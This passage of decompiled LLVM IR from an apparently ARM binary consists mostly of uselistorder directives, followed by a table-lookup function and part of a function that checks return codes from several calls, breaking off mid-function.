  uselistorder i32 %v2_9388, { 1, 0, 2 }
  uselistorder i32 %v1_9374, { 0, 2, 1 }
  uselistorder i32 %v4_936c, { 1, 2, 0, 3 }
  uselistorder i1 %v7_933c, { 1, 0 }
  uselistorder i1 %v7_92d4, { 1, 0 }
  uselistorder i32 %v5_92d0, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92b8.v4_92a0, { 1, 0, 2 }
  uselistorder i1 %v7_9270, { 1, 0 }
  uselistorder i1 %v7_91fc, { 1, 0 }
  uselistorder i32 %v5_91f8, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_91e0.v4_91c8, { 1, 0, 2 }
  uselistorder i1 %v7_91a4, { 1, 0 }
  uselistorder i1 %v7_9124, { 1, 0 }
  uselistorder i32 %v5_9120, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9108.v4_90f0, { 1, 0, 2 }
  uselistorder i1 %v7_90d0, { 1, 0 }
  uselistorder i1 %v7_90a4, { 1, 0 }
  uselistorder i1 %v7_907c, { 1, 0 }
  uselistorder i32 %v0_9038, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9008, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fa0, { 1, 0 }
  uselistorder i32 %v2_8f94, { 1, 0 }
  uselistorder i32 %v1_8f94, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v3_8f6c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f4c, { 1, 0 }
  uselistorder i32 %v2_8f40, { 1, 0 }
  uselistorder i32 %v1_8f40, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f34, { 1, 0 }
  uselistorder i32 %v3_8f18, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8ed4, { 1, 0 }
  uselistorder i32 %v5_8eb0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8e98, { 1, 0 }
  uselistorder i32 %v3_8e7c, { 1, 0 }
  uselistorder i32 %v0_8e38, { 1, 0 }
  uselistorder i32 %v3_8e04, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e04, { 1, 0 }
  uselistorder i32 %v0_8e04, { 1, 0 }
  uselistorder i32 %v3_8dec, { 1, 0, 2 }
  uselistorder i32 %v0_8de0, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_8d5c, { 1, 0 }
  uselistorder i32 %v4_8d50, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d20, { 1, 0 }
  uselistorder i32 %v2_8d10, { 1, 0 }
  uselistorder i32 %v2_8d04, { 1, 0 }
  uselistorder i32 %v1_8d04, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8cf8, { 1, 0 }
  uselistorder i32 %v3_8cdc, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8cc0, { 0, 2, 1 }
  uselistorder i32 %v2_8c98, { 1, 0 }
  uselistorder i32 %v1_8c98, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8c98, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8c84, { 1, 0 }
  uselistorder i32 %v3_8c64, { 1, 0, 2 }
  uselistorder i32 %v1_8bc8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8a6c, { 1, 0 }
  uselistorder i32 %v3_884c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_87f8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_87f4, { 1, 0 }
  uselistorder i32 %v3_87e8, { 2, 0, 1 }
  uselistorder i1 %v7_87d4, { 1, 0 }
  uselistorder i32 %v3_87cc, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87a4, { 1, 0 }
  uselistorder i1 %v7_879c, { 1, 0 }
  uselistorder i32 %v3_8780, { 1, 0 }
  uselistorder i32 %v1_8760, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8760, { 0, 2, 1 }
  uselistorder i32 %v2_875c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8748, { 1, 0, 2 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v2_86e8, { 1, 0 }
  uselistorder i32 %v1_86e8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_86dc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_86e8, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_86cc, { 1, 0 }
  uselistorder i32 %v3_86c0, { 1, 0, 2 }
  uselistorder i1 %v7_861c, { 1, 0 }
  uselistorder i32 %v3_8618, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_85f4, { 1, 0 }
  uselistorder i32 %v4_85cc, { 2, 1, 0 }
  uselistorder i8 %v3_85cc, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_85cc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8870, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_8594, { 1, 0 }
  uselistorder i32 %v1_8594, { 1, 0 }
  uselistorder i1 %v7_858c, { 1, 0 }
  uselistorder i1 %v7_8584, { 1, 0 }
  uselistorder i1 %v7_857c, { 1, 0 }
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i1 %v7_8574, { 1, 0 }
  uselistorder i1 %v7_856c, { 1, 0 }
  uselistorder i32 %v1_8550, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_84f0, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88b0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_86d0, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e44, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_84cc, { 1, 0 }
  uselistorder i32 %v0_84cc, { 1, 0, 2 }
  uselistorder i32 %v2_8498, { 1, 0, 2, 3 }
  uselistorder i32 %v3_848c, { 1, 0, 2 }
  uselistorder i32 %v0_8480, { 1, 0 }
  uselistorder i32 %v5_8478, { 1, 0 }
  uselistorder i32 %v0_8444, { 1, 2, 0, 3 }
  uselistorder i32 %v0_83cc, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_83b4, { 1, 0 }
  uselistorder i32 %v5_83b0, { 1, 0 }
  uselistorder i32 %v2_8370, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_835c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8350, { 0, 1, 3, 2 }
  uselistorder i1 %v2_82e0, { 1, 0, 2 }
  uselistorder i32* %v11_82b4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82b0, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 32, 31, 30, 28, 27, 29, 26, 25, 12, 23, 22, 9, 8, 7, 24, 6, 38, 37, 36, 34, 35, 33, 43, 42, 41, 40, 39, 5, 4, 3, 2, 1, 0, 44, 45 }
  uselistorder i32 %v2_82a8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_8298, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_8288, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8260, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_823c, { 0, 28, 32, 33, 34, 35, 1, 30, 2, 3, 31, 36, 17, 18, 4, 27, 5, 6, 29, 37, 7, 26, 8, 9, 38, 10, 11, 24, 25, 39, 12, 21, 13, 22, 23, 40, 14, 15, 19, 20, 41, 42, 43, 16, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 %v5_8234, { 1, 0 }
  uselistorder i32 %v6_81bc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 10, 28, 25, 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 29, 30 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 9, 10, 11, 12, 1, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 78, 39, 40, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 41, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 141, 142, 143, 144, 95, 96, 97, 98, 99, 100, 101, 105, 106, 102, 103, 104, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 8, 120, 121, 119, 7, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 69, 70, 71, 72, 73, 74, 75, 76, 114, 115, 116, 77, 78, 79, 80, 81, 83, 84, 82, 85, 86, 88, 87, 89, 90, 91, 92, 93, 94, 95, 96, 6, 97, 98, 5, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 49, 25, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 58, 56, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 151, 152, 153, 154, 155, 156, 157, 158, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 150, 149, 0 }
  uselistorder i32* %r0.global-to-local, { 20, 19, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 34, 32, 31, 33, 217, 35, 214, 218, 75, 45, 36, 38, 37, 39, 41, 40, 43, 42, 46, 44, 47, 49, 48, 50, 52, 51, 54, 53, 58, 55, 56, 57, 60, 61, 63, 62, 65, 64, 66, 67, 68, 70, 69, 71, 72, 73, 76, 74, 78, 77, 79, 81, 80, 82, 85, 83, 84, 87, 86, 91, 88, 89, 90, 92, 94, 93, 96, 95, 97, 99, 98, 101, 100, 102, 103, 105, 104, 106, 107, 108, 18, 110, 109, 112, 111, 113, 115, 114, 116, 117, 118, 120, 119, 122, 121, 123, 125, 124, 126, 128, 127, 130, 129, 131, 133, 132, 134, 137, 135, 136, 139, 138, 141, 140, 142, 144, 143, 145, 147, 146, 149, 148, 150, 152, 151, 4, 153, 155, 154, 157, 156, 159, 158, 162, 160, 161, 164, 163, 165, 167, 166, 168, 171, 169, 170, 173, 172, 175, 174, 176, 178, 177, 179, 181, 180, 182, 183, 184, 186, 185, 188, 187, 189, 191, 190, 192, 194, 193, 195, 196, 197, 199, 198, 201, 200, 202, 204, 203, 205, 207, 206, 208, 3, 209, 210, 211, 212, 329, 16, 330, 17, 331, 332, 15, 333, 334, 13, 335, 336, 337, 339, 338, 340, 342, 341, 12, 343, 344, 345, 14, 215, 213, 220, 216, 219, 2, 221, 222, 1, 223, 224, 225, 226, 227, 228, 229, 230, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 267, 266, 268, 269, 10, 270, 9, 271, 273, 272, 8, 275, 274, 279, 276, 277, 278, 59, 7, 280, 281, 282, 5, 283, 284, 285, 286, 6, 287, 11, 288, 289, 291, 290, 293, 292, 294, 295, 296, 298, 297, 299, 300, 302, 301, 304, 303, 306, 305, 308, 307, 310, 309, 311, 312, 313, 314, 315, 316, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 49, 50, 51, 52, 53, 21, 22, 23, 24, 25, 26, 27, 47, 48, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32* %fp.global-to-local, { 0, 10, 1, 13, 2, 14, 15, 16, 17, 4, 3, 7, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 5, 6, 8, 9, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 143, 144, 145, 146, 147, 148, 149, 150, 151, 90, 152, 153, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 141, 142, 100, 102, 101, 103, 104, 109, 111, 110, 105, 106, 107, 108, 112, 113, 114, 115, 116, 117, 125, 126, 118, 119, 120, 121, 122, 123, 124, 127, 0, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 156, 157, 158, 159, 160, 161, 162, 163, 164, 96, 165, 91, 92, 93, 94, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 153, 154, 155, 107, 108, 109, 114, 116, 115, 110, 111, 112, 113, 117, 118, 119, 120, 121, 122, 123, 124, 132, 133, 125, 126, 127, 128, 129, 130, 131, 134, 0, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152 }
  uselistorder i32 49, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_18548.46 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18538.42 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18530.40 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1852c.36 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_9e04, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9cc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ca8, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_9a74, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9a48, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_99ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_98d8, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_988c, { 1, 0 }
  uselistorder label %dec_label_pc_9864, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9858, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9614, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9510, { 0, 2, 1 }
  uselistorder label %dec_label_pc_9464, { 1, 0 }
  uselistorder label %dec_label_pc_945c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9434, { 1, 0 }
  uselistorder label %dec_label_pc_93f8, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_930c, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_9040, { 1, 0 }
  uselistorder label %dec_label_pc_8ef8, { 1, 0 }
  uselistorder label %dec_label_pc_8e18, { 1, 0 }
  uselistorder label %dec_label_pc_8dc8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8da0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d34, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8c44, { 1, 0 }
  uselistorder label %dec_label_pc_8c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8b7c, { 1, 0 }
  uselistorder label %dec_label_pc_8b44, { 1, 0 }
  uselistorder label %dec_label_pc_887c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_87ac, { 7, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15, 3, 16, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_8774, { 1, 0 }
  uselistorder label %dec_label_pc_86f8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_85b4, { 5, 3, 4, 0, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_8530.dec_label_pc_8530_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8508.dec_label_pc_8508_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_84ec, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_84ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8480, { 1, 0 }
  uselistorder label %dec_label_pc_8404, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_82bc, { 1, 0 }
  uselistorder label %dec_label_pc_8274, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f20(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f20:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f20 = icmp eq i32 %arg1, 0
  br i1 %v2_9f20, label %dec_label_pc_9f68, label %dec_label_pc_9f30

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f20
  %v0_9f30 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f30 = add i32 %v0_9f30, 4
  %v2_9f30 = inttoptr i32 %v1_9f30 to i8*
  %v3_9f30 = load i8, i8* %v2_9f30, align 1
  %v4_9f30 = zext i8 %v3_9f30 to i32
  %v9_9f34 = icmp eq i32 %v4_9f30, %arg3
  br i1 %v9_9f34, label %dec_label_pc_9f74, label %dec_label_pc_9f58.preheader

dec_label_pc_9f58.preheader:                      ; preds = %dec_label_pc_9f30
  br label %dec_label_pc_9f58

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9f58
  %v1_9f48 = add i32 %v0_9f50.in, 12
  %v2_9f48 = inttoptr i32 %v1_9f48 to i8*
  %v3_9f48 = load i8, i8* %v2_9f48, align 1
  %v4_9f48 = zext i8 %v3_9f48 to i32
  %v9_9f4c = icmp eq i32 %v4_9f48, %arg3
  br i1 %v9_9f4c, label %dec_label_pc_9f74, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f58.preheader, %dec_label_pc_9f48
  %v0_9f50.in = phi i32 [ %v0_9f30, %dec_label_pc_9f58.preheader ], [ %v0_9f50, %dec_label_pc_9f48 ]
  %v0_9f58 = phi i32 [ 0, %dec_label_pc_9f58.preheader ], [ %v1_9f58, %dec_label_pc_9f48 ]
  %v0_9f50 = add i32 %v0_9f50.in, 8
  %v1_9f58 = add i32 %v0_9f58, 1
  %v9_9f5c = icmp eq i32 %v1_9f58, %arg1
  store i32 %v0_9f50, i32* %r1.global-to-local, align 4
  br i1 %v9_9f5c, label %dec_label_pc_9f68, label %dec_label_pc_9f48

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f58, %dec_label_pc_9f20, %dec_label_pc_9f74
  %v0_9f68 = phi i32 [ %arg4, %dec_label_pc_9f20 ], [ %v2_9f74, %dec_label_pc_9f74 ], [ %arg4, %dec_label_pc_9f58 ]
  ret i32 %v0_9f68

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9f48, %dec_label_pc_9f30
  %v0_9f74 = phi i32 [ %v0_9f30, %dec_label_pc_9f30 ], [ %v0_9f50, %dec_label_pc_9f48 ]
  %v1_9f74 = inttoptr i32 %v0_9f74 to i32*
  %v2_9f74 = load i32, i32* %v1_9f74, align 4
  br label %dec_label_pc_9f68

; uselistorder directives
  uselistorder i32 %v1_9f58, { 1, 0 }
  uselistorder i32 %v0_9f50, { 1, 0, 2 }
  uselistorder i32 %v0_9f50.in, { 1, 0 }
  uselistorder i32 %v0_9f30, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
}

define i32 @function_9f7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9f7c:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9f7c = load i32, i32* @r4, align 4
  store i32 %v3_9f7c, i32* %stack_var_-32, align 4
  %v6_9f7c = load i32, i32* @r5, align 4
  %v9_9f7c = load i32, i32* @r6, align 4
  %v12_9f7c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_9f94 = call i32 @function_12e08()
  store i32 %v0_9f94, i32* @r0, align 4
  %v7_9f98 = icmp eq i32 %v0_9f94, -1
  %tmp23 = icmp slt i32 %v0_9f94, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9f7c
  br label %dec_label_pc_9fb8

bb24:                                             ; preds = %dec_label_pc_9f7c
  %. = zext i1 %v7_9f98 to i32
  store i32 %., i32* @r5, align 4
  %v2_9fb0 = icmp eq i1 %v7_9f98, false
  br i1 %v2_9fb0, label %dec_label_pc_9fc0, label %dec_label_pc_9fb8

dec_label_pc_9fb8:                                ; preds = %.thread2, %bb24
  %v2_9fb8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_9fb8, i32* @r4, align 4
  store i32 %v6_9f7c, i32* @r5, align 4
  store i32 %v9_9f7c, i32* @r6, align 4
  store i32 %v12_9f7c, i32* @r7, align 4
  ret i32 %v0_9f94

dec_label_pc_9fc0:                                ; preds = %bb24
  %v0_9fc0 = call i32 @function_12e08()
  %v7_9fc4 = icmp eq i32 %v0_9fc0, -1
  store i32 %v0_9fc0, i32* @r4, align 4
  br i1 %v7_9fc4, label %dec_label_pc_9ff4, label %dec_label_pc_9fd0

dec_label_pc_9fd0:                                ; preds = %dec_label_pc_9fc0
  %v2_9fd0 = icmp eq i32 %v0_9fc0, 0
  br i1 %v2_9fd0, label %dec_label_pc_9fd8, label %dec_label_pc_9ffc

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fd0
  %v0_9fd8 = load i32, i32* @r6, align 4
  %v1_9fdc = call i32 @function_1524c(i32 %v0_9fd8)
  store i32 %v1_9fdc, i32* @r0, align 4
  %v0_9fe0 = call i32 @function_12cdc()
  %v2_9fe8 = call i32 @function_12f18(i32 %v0_9fe0, i32 9)
  %v0_9fec = load i32, i32* @r4, align 4
  %v1_9ff0 = call i32 @function_15194(i32 %v0_9fec)
  br label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fc0, %dec_label_pc_9fd8
  %v0_9ff4 = load i32, i32* @r5, align 4
  %v1_9ff8 = call i32 @function_15194(i32 %v0_9ff4)
  br label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_9fd0, %dec_label_pc_9ff4
  %v2_a000 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a000 = zext i8 %v2_a000 to i32
  %v2_a004 = icmp eq i8 %v2_a000, 0
  br i1 %v2_a004, label %dec_label_pc_a048, label %dec_label_pc_a00c

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9ffc
  %v2_a010 = load i32, i32* @global_var_212f0.53, align 4
  %v1_a014 = inttoptr i32 %v2_a010 to i32*
  %v2_a014 = load i32, i32* %v1_a014, align 4
  store i32 %v2_a014, i32* @ip, align 4
  %v1_a018 = add i32 %v2_a014, 4
  %v2_a018 = inttoptr i32 %v1_a018 to i8*
  %v3_a018 = load i8, i8* %v2_a018, align 1
  %v4_a018 = zext i8 %v3_a018 to i32
  %v1_a01c = load i32, i32* @r7, align 4
  %v9_a01c = icmp eq i32 %v4_a018, %v1_a01c
  br i1 %v9_a01c, label %dec_label_pc_a050, label %dec_label_pc_a03c.preheader

